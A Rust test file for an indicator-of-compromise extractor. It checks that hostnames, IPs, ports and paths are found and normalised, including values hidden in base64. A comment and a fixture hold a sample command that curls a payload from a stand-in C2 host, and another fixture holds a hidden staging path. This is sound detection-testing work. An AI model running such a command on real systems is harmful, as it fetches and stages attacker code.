#![allow(clippy::unwrap_used, clippy::expect_used, clippy::panic)]

use std::path::Path;
use stng::{
    ExtractOptions, ExtractedString, IocKind, StringKind, StringMethod, extract_iocs,
    extract_strings_with_options,
};

fn extracted(value: &str, kind: Option<StringKind>, offset: u64) -> ExtractedString {
    ExtractedString {
        value: value.to_string(),
        data_offset: offset,
        data_len: u32::try_from(value.len()).unwrap(),
        method: StringMethod::RawScan,
        kind,
        fragments: None,
    }
}

#[test]
fn encoded_url_host_is_canonical_and_keeps_encoded_source_span() {
    // "curl https://c2.example.com:443/payload"
    let encoded = b"Y3VybCBodHRwczovL2MyLmV4YW1wbGUuY29tOjQ0My9wYXlsb2Fk";
    let strings = extract_strings_with_options(encoded, &ExtractOptions::new(4));
    let iocs = extract_iocs(&strings);

    let host = iocs
        .iter()
        .find(|ioc| ioc.kind == IocKind::Hostname && ioc.value == "c2.example.com")
        .expect("missing hostname from base64-decoded URL");
    assert_eq!(host.ports, vec![443]);
    assert!(
        host.occurrences
            .iter()
            .any(|occurrence| occurrence.method == StringMethod::Base64Decode
                && occurrence.source_spans == vec![[0, encoded.len() as u64]])
    );
}

#[test]
fn encoded_uncommon_full_path_keeps_provenance() {
    // "/tmp/.stage-9f3a/payload.bin"
    let encoded = b"L3RtcC8uc3RhZ2UtOWYzYS9wYXlsb2FkLmJpbg==";
    let strings = extract_strings_with_options(encoded, &ExtractOptions::new(4));
    let iocs = extract_iocs(&strings);

    let path = iocs
        .iter()
        .find(|ioc| ioc.kind == IocKind::Path && ioc.value == "/tmp/.stage-9f3a/payload.bin")
        .expect("missing path from base64-decoded value");
    assert!(path.occurrences.iter().any(|occurrence| {
        occurrence.method == StringMethod::Base64Decode
            && occurrence.source_spans == vec![[0, encoded.len() as u64]]
    }));
}

#[test]
fn common_dotted_lookalikes_do_not_become_iocs() {
    let lookalikes = [
        "foo.rs",
        "main.go",
        "index.sh",
        "archive.tar.gz",
        "serde_json::value",
        "java.lang.String",
        "v1.2.3",
        "Chrome/100.0.0.0",
        "1.2.0.0",
        "1.2.0.4",
        "module.example",
        "example.invalid",
        "localhost",
        "com",
        "192.168.001.001",
        "999.1.1.1",
    ];
    let strings: Vec<_> = lookalikes
        .iter()
        .enumerate()
        .map(|(i, value)| extracted(value, None, i as u64 * 32))
        .collect();

    assert!(extract_iocs(&strings).is_empty());
}

#[test]
fn explicitly_typed_common_values_are_still_not_iocs() {
    let strings = [
        extracted("wallet.dat", Some(StringKind::Path), 0),
        extracted("/etc/hosts", Some(StringKind::Path), 32),
        extracted("/home/builder/src/main.rs", Some(StringKind::Path), 64),
        extracted("1.2.0.4", Some(StringKind::IP), 96),
        extracted("192.168.1.1", Some(StringKind::IP), 128),
        extracted("crl.microsoft.com", Some(StringKind::Hostname), 160),
        extracted("github.com", Some(StringKind::Hostname), 192),
    ];

    assert!(extract_iocs(&strings).is_empty());
}

#[test]
fn exact_network_types_and_endpoints_are_canonical_and_deduplicated() {
    let strings = [
        extracted("45.33.32.156", Some(StringKind::IP), 0),
        extracted("45.33.32.156:443", Some(StringKind::IPPort), 32),
        extracted("C2.Example.COM:8443", None, 64),
        extracted("c2.example.com.", Some(StringKind::Hostname), 96),
    ];

    let iocs = extract_iocs(&strings);
    assert_eq!(iocs.len(), 2);
    assert_eq!(iocs[0].kind, IocKind::Ip);
    assert_eq!(iocs[0].value, "45.33.32.156");
    assert_eq!(iocs[0].ports, vec![443]);
    assert_eq!(iocs[0].count, 2);
    assert_eq!(iocs[1].kind, IocKind::Hostname);
    assert_eq!(iocs[1].value, "c2.example.com");
    assert_eq!(iocs[1].ports, vec![8443]);
    assert_eq!(iocs[1].count, 2);
}

#[test]
fn malformed_network_shapes_never_emit() {
    let malformed = [
        "http://",
        "http://example.com:0/",
        "http://example.com:65536/",
        "http://exa_mple.com/",
        "http://[2001:db8::1",
        "host.example.com:notaport",
        ":443",
        "example.com:",
        "[2001:db8::1]:notaport",
        "http://192.168.1.1/admin",
        "http://203.0.113.7/test",
        "http://45.0.32.156/test",
    ];
    let strings: Vec<_> = malformed
        .iter()
        .enumerate()
        .map(|(i, value)| extracted(value, None, i as u64 * 32))
        .collect();

    assert!(extract_iocs(&strings).is_empty());
}

#[test]
fn clean_system_binary_iocs_have_structural_evidence() {
    for path in ["/bin/ls", "/bin/cat"] {
        if !Path::new(path).exists() {
            eprintln!("Skipping: {path} not found");
            continue;
        }
        let data = std::fs::read(path).unwrap();
        let strings = extract_strings_with_options(&data, &ExtractOptions::new(10));
        let iocs = extract_iocs(&strings);
        for ioc in iocs {
            assert_ne!(ioc.kind, IocKind::Key, "{path} produced a key IOC");
            for occurrence in &ioc.occurrences {
                let source = strings
                    .iter()
                    .find(|candidate| {
                        candidate
                            .source_spans()
                            .map(|(offset, len)| [offset, len])
                            .eq(occurrence.source_spans.iter().copied())
                    })
                    .expect("IOC occurrence must refer to an extracted string");
                if ioc.kind == IocKind::Path {
                    assert!(
                        matches!(
                            source.kind,
                            Some(StringKind::Path | StringKind::SuspiciousPath)
                        ),
                        "{path} emitted an untyped path IOC: {ioc:#?}"
                    );
                } else {
                    let typed_network = matches!(
                        source.kind,
                        Some(StringKind::IP | StringKind::IPPort | StringKind::Hostname)
                    );
                    let url_authority = source.value.contains("://");
                    let exact_endpoint = source
                        .value
                        .trim()
                        .rsplit_once(':')
                        .is_some_and(|(_, port)| port.parse::<u16>().is_ok_and(|port| port != 0));
                    assert!(
                        typed_network || url_authority || exact_endpoint,
                        "{path} emitted an IOC without structural evidence: {ioc:#?}"
                    );
                }
            }
        }
    }
}
